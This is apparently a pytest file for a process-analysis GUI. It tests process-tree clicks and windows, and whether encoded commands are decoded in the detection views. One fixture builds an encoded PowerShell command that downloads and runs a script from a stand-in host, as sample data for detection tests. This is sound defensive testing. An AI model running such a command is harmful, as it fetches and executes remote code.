"""Process tree: one double-click (or Enter) opens exactly one process window."""
import os

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

from test_pipeline_and_runner import load_fixture_result

QtWidgets = pytest.importorskip("PySide6.QtWidgets")
from PySide6.QtCore import QEvent, QPoint, QPointF, Qt    # noqa: E402
from PySide6.QtGui import QMouseEvent                      # noqa: E402
from PySide6.QtTest import QTest                           # noqa: E402


@pytest.fixture(scope="module")
def app():
    return QtWidgets.QApplication.instance() or QtWidgets.QApplication([])


@pytest.fixture()
def view(app):
    from app.windows.process_tree_window import ProcessTreeView
    widget = ProcessTreeView(load_fixture_result())
    widget.resize(1300, 800)
    widget.show()
    app.processEvents()
    yield widget
    for window in list(widget._open_windows):
        window.close()
    app.processEvents()
    widget.close()


def process_windows(app):
    from app.windows.process_window import ProcessWindow
    return [w for w in app.topLevelWidgets() if isinstance(w, ProcessWindow) and w.isVisible()]


def process_item(view, pid):
    item = view.items[pid]
    view.select_pid(pid)
    return item


def double_click(app, view, item):
    """The event sequence Windows delivers for a double-click: press, release, double-click, release.
    (QTest.mouseDClick does not reach QAbstractItemView's double-click handling under the offscreen platform.)"""
    rect = view.tree.visualItemRect(item)
    viewport = view.tree.viewport()
    point = QPointF(rect.x() + 40, rect.center().y())
    left, none = Qt.MouseButton.LeftButton, Qt.MouseButton.NoButton
    for kind, buttons in ((QEvent.Type.MouseButtonPress, left), (QEvent.Type.MouseButtonRelease, none),
                          (QEvent.Type.MouseButtonDblClick, left), (QEvent.Type.MouseButtonRelease, none)):
        event = QMouseEvent(kind, point, viewport.mapToGlobal(point), left, buttons, Qt.KeyboardModifier.NoModifier)
        QtWidgets.QApplication.sendEvent(viewport, event)
    app.processEvents()


def test_single_click_selects_but_opens_nothing(app, view):
    item = process_item(view, 4)
    rect = view.tree.visualItemRect(item)
    QTest.mouseClick(view.tree.viewport(), Qt.MouseButton.LeftButton, Qt.KeyboardModifier.NoModifier, QPoint(rect.x() + 40, rect.center().y()))
    app.processEvents()
    assert view.current_pid() == 4
    assert "System" in view.detail.toPlainText()          # the detail panel still updates on a single click
    assert process_windows(app) == []


def test_one_double_click_opens_exactly_one_window(app, view):
    double_click(app, view, process_item(view, 4))
    assert len(process_windows(app)) == 1


def test_repeated_double_click_reuses_the_window_and_other_processes_get_their_own(app, view):
    first = process_item(view, 4)
    double_click(app, view, first)
    double_click(app, view, first)
    assert len(process_windows(app)) == 1
    other = next(pid for pid in view.items if pid != 4 and isinstance(pid, int))
    double_click(app, view, process_item(view, other))
    assert sorted(w.process.pid for w in process_windows(app)) == sorted([4, other])


def test_close_and_reopen(app, view):
    item = process_item(view, 4)
    double_click(app, view, item)
    process_windows(app)[0].close()
    app.processEvents()
    app.sendPostedEvents(None, 0)                            # DeleteOnClose
    assert process_windows(app) == [] and view._open_windows == []
    double_click(app, view, item)
    assert len(process_windows(app)) == 1


def test_enter_key_and_button_each_open_one_window(app, view):
    process_item(view, 4)
    view.tree.setFocus()
    QTest.keyClick(view.tree, Qt.Key.Key_Return)
    app.processEvents()
    assert len(process_windows(app)) == 1
    view.open_button.click()
    app.processEvents()
    assert len(process_windows(app)) == 1                    # same process: the existing window is raised


# ----------------------------------------------------------------------------- roadmap features in the GUI
def _encoded_process(result):
    import base64
    script = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
    proc = next(p for p in result.processes if p.pid != 4)
    proc.command_line = "powershell.exe -NoP -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()
    return proc, script


def test_finding_details_show_decoded_command_and_attack_tags(app):
    from app.engines.windows.indicators.engine import DEFAULT_RULES
    from app.windows.indications_window import IndicationDetails
    result = load_fixture_result()
    proc, script = _encoded_process(result)
    rule = next(r for r in DEFAULT_RULES if r.rule_id == "CL-001")
    ind = rule.make(title="t", severity="High", summary="s", reasons=["r"], evidence=["Command line: " + proc.command_line[:60]],
                    source_plugins=["windows.cmdline"], process=proc)
    dialog = IndicationDetails(ind, None, None, command_line=proc.command_line)       # full line given, evidence line is cut
    text = dialog.findChild(QtWidgets.QTextBrowser).toPlainText()
    assert script in text and "T1059.001" in text and "windows.cmdline, PID" in text
    plain = IndicationDetails(next(r for r in DEFAULT_RULES if r.rule_id == "PR-003").make(title="t", severity="Low", summary="s", reasons=[]))
    assert "ATT&CK" not in plain.findChild(QtWidgets.QTextBrowser).toPlainText() and "Decoded" not in plain.findChild(QtWidgets.QTextBrowser).toPlainText()


def test_process_window_and_tree_panel_show_decoded_command(app):
    from app.windows.process_tree_window import ProcessTreeView
    from app.windows.process_window import ProcessWindow
    result = load_fixture_result()
    proc, script = _encoded_process(result)
    window = ProcessWindow(proc, None, dump_path="x.raw")
    assert any(script in b.toPlainText() for b in window.findChildren(QtWidgets.QTextBrowser))
    tree = ProcessTreeView(result)
    assert script in tree.summary_html(proc)
    assert "Decoded" not in tree.summary_html(next(p for p in result.processes if p.pid == 4))
